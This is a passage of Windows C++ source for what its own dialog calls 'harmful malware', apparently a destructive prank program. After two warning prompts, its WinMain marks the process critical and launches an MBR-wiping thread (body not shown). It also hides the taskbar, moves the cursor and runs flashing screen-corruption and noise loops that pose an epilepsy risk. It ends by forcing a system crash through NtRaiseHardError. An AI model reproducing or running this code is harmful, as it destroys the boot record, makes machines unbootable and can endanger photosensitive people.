		BitBlt(hdc, sw - 500, sw - 5, sw, sh, hdc, 0, 0, SRCCOPY);
		StretchBlt(hdc, 0, 0, sw + rand() % 100, sh + rand() % 100, hdc, 0, 0, sw, sh, SRCPAINT); //why++;//why++;
		x += incrementor * signX;
		y += incrementor * signY;
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		Pie(hdc, top_x, top_y, bottom_x, bottom_y, rand() % 100, rand() % 100, rand() % 100, rand() % 100);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		//Sleep(10);
		//StretchBlt(hdc, sw/4+why/2, sh/4+why/2, sw/2-why, sh/2-why, hdc, 0, 0, sw, sh, SRCCOPY); why++;why++;
		//StretchBlt(hdc, why, why, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, why, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, sh/2, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw+why, sh+why, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw, sh, hdc, 0, 0, sw, sh, NOTSRCERASE); why++;
		//PatBlt(hdc,rand()%100+1,rand()%100+1,rand()%sw,rand()%sh,PATINVERT);
		//Sleep(100);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCPAINT);
		//SetStretchBltMode(hdc,COLORONCOLOR);
		//SetStretchBltMode(hdc,HALFTONE);		
		//StretchBlt(hdc, 0, 0, rand()%sw-25, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//BitBlt(hdc, 1, 0, sw, sh, hdc, 0, 0, SRCINVERT); //why++;
		//BitBlt(hdc, -1, 0, sw, sh, hdc, 0, 0, SRCINVERT);
		//Ellipse(hdc,rand()%10-15,sh,rand()%10-15,sw);
		//Sleep(500);
	}
}
DWORD WINAPI shader7(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	//int why = 1;
	while (true)
	{
		//BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
		//BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
		//BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
		//BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
		//BitBlt(hdc,-5,0,sw-10,sh,hdc,0,0,PATINVERT);
		//BitBlt(hdc,5,0,sw+10,sh,hdc,0,0,SRCINVERT);
		//BitBlt(hdc,0,5,sw,sh+10,hdc,0,0,PATINVERT);
		//BitBlt(hdc,0,-5,sw,sh-10,hdc,0,0,SRCINVERT);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		BitBlt(hdc, rand() % 500, rand() % 500, rand() % sw, rand() % sh, hdc, 0, 0, PATINVERT);
		BitBlt(hdc, rand() % 666, rand() % 666, sw, sh, hdc, rand() % 666, rand() % 666, NOTSRCERASE);
		DeleteObject(brush);
		StretchBlt(hdc, -10 / 2, -10 / 2, sw + 10, sh + 10, hdc, 0, 0, sw, sh, SRCCOPY);
		//StretchBlt(hdc,-5,0,sw,sh,hdc,0,0,sw,sh,SRCCOPY);
		//Sleep(10);
		//StretchBlt(hdc, 0, 0, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, 0, sh/2, sw, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//BitBlt(hdc, 0, 0, y, x, hdc, 0, 0, PATINVERT);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCCOPY);
		//BitBlt(hdc, 0, 0, y, x, hdc, 0, 0, PATINVERT);
		//BitBlt(hdc, 10, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		//BitBlt(hdc, -10, 0, sw, sh, hdc, 0, 0, SRCPAINT);
		//Sleep(300);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCPAINT);
		//SetStretchBltMode(hdc,COLORONCOLOR);
		//SetStretchBltMode(hdc,HALFTONE);		
		//StretchBlt(hdc, 0, 0, rand()%sw+25, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//StretchBlt(hdc, 0, 0, rand()%sw-25, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//BitBlt(hdc,rand()%10+1,rand()%10+1,sw,sh,hdc,0,0,SRCINVERT);
		//DrawIconEx(hdc,rand()%sw,rand()%sh,LoadIcon(NULL, IDI_WINLOGO),200,200,0,NULL,DI_NORMAL);
		//DrawIconEx(hdc,rand()%sw,rand()%sh,LoadIcon(NULL, IDI_WARNING),200,200,0,NULL,DI_NORMAL);
		//BitBlt(hdc, 0, 1, sw, sh, hdc, 0, 0, SRCAND);
		//BitBlt(hdc, -30, 0, sw, sh, hdc, 0, 0, SRCCOPY);//credit to pankoza for the train effect
		//BitBlt(hdc, sw - 30, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		//StretchBlt(hdc, why, why, sw, sh, hdc, 0, 0, sw, sh, SRCCOPY); why++;//why++;
		//StretchBlt(hdc, sw/4+why/2, sh/4+why/2, sw/2-why, sh/2-why, hdc, 0, 0, sw, sh, SRCCOPY); why++;why++;
		//StretchBlt(hdc, why, why, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, why, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2, sh/2, sw/4, sh/4, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); //why++;
		//StretchBlt(hdc, sw/2+0-why, sh/2+0-why, sw/2, sh/2, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw+why, sh+why, hdc, 0, 0, sw, sh, SRCCOPY); why++;
		//StretchBlt(hdc, 0-why, 0-why, sw, sh, hdc, 0, 0, sw, sh, NOTSRCERASE); why++;
		//PatBlt(hdc,rand()%100+1,rand()%100+1,rand()%sw,rand()%sh,PATINVERT);
		//Sleep(100);
		//BitBlt(hdc, 10, 0, y, x, hdc, 0, 0, SRCPAINT);
		//SetStretchBltMode(hdc,COLORONCOLOR);
		//SetStretchBltMode(hdc,HALFTONE);		
		//StretchBlt(hdc, 0, 0, rand()%sw-25, sh, hdc, 0, 0, sw, sh, SRCCOPY);
		//BitBlt(hdc, 1, 0, sw, sh, hdc, 0, 0, SRCINVERT); //why++;
		//BitBlt(hdc, -1, 0, sw, sh, hdc, 0, 0, SRCINVERT);
		//Ellipse(hdc,rand()%10-15,sh,rand()%10-15,sw);
		//Sleep(500);
	}
}
DWORD WINAPI textout(LPVOID lpParam)
{
	HDC hdc;
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	LPCWSTR text1 = L"BleuLejendTales1234";
	LPCWSTR text2 = L"https://www.youtube.com/watch?v=XPYFaMlFwl8";	//link for the scaredy mouse episode
	LPCWSTR text3 = L"Pichew rules!";
	while (1)
	{
		HDC hdc = GetDC(0);
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutW(hdc, rand() % sw, rand() % sh, text1, wcslen(text1));
		TextOutW(hdc, rand() % sw, rand() % sh, text2, wcslen(text2));
		TextOutW(hdc, rand() % sw, rand() % sh, text3, wcslen(text3));
		ReleaseDC(0, hdc);
		Sleep(20);
	}
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t & t | t * t >> 7 | t >> 4);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
//10*(t>>7|t*2|t>>6)^4*(t&t>>13|t<<6)
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(10 * (t >> 7 | t * 2 | t >> 6) ^ 4 * (t & t >> 13 | t << 6));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
//t*t<<(t>>9&t>>6)
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * t << (t >> 9 & t >> 6));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
//t*(t^t+(t>>15|2)^(t-1280^t)>>10)
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t ^ t + (t >> 15 | 2) ^ (t - 1280 ^ t) >> 10));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
//20*t*t*(t>>10)/5>>t
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(20 * t * t * (t >> 10) / 5 >> t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
//(t>>8^(t>>50)-1^1)%9*t
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 8 ^ (t >> 50) - 1 ^ 1) % 9 * t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
//t|(t^6%t/5)^(t>>6)|t>>7
VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t ^ t / 5) ^ (t >> 6) | t >> 7);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
//t%((t>>9)^90000000000000%t>>9|t)
VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * t ^ t >> 7);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
DWORD WINAPI notaskbar(LPVOID lpvd) {
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}
int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"This is a harmful malware made by anotheraccount\nWarning: this will move your mouse and kill your MBR!\n\nClick yes to Run\nClick no to Exit", L"BleuLejendTales1234.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure? It will overwrite the boot record and it contains flashing lights - NOT for epilepsy and it will move your mouse!", L"FINAL WARNING", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			ProcessIsCritical();
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			Sleep(100);
			HANDLE movecursor = CreateThread(0, 0, movecur, 0, 0, 0); //disabled for testing, dont forget to enable both when finished!
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);//shader1
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);//shader2
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread3 = CreateThread(0, 0, textout, 0, 0, 0);//textout
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread4 = CreateThread(0, 0, shader3, 0, 0, 0);//shader3
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			TerminateThread(movecursor, 0);
			CloseHandle(movecursor);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE movecursor2 = CreateThread(0, 0, movecur2, 0, 0, 0); //disabled for testing
			HANDLE thread5 = CreateThread(0, 0, shader4, 0, 0, 0);//shader4
			sound5();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			CreateThread(0, 0, notaskbar, 0, 0, 0);
			HANDLE thread6 = CreateThread(0, 0, shader5, 0, 0, 0);//shader5
			sound6();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread7 = CreateThread(0, 0, shader6, 0, 0, 0);//shader6
			sound7();
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread8 = CreateThread(0, 0, shader7, 0, 0, 0);//shader7 (final)
			sound8();
			Sleep(30000);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xDEADBEEF, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}
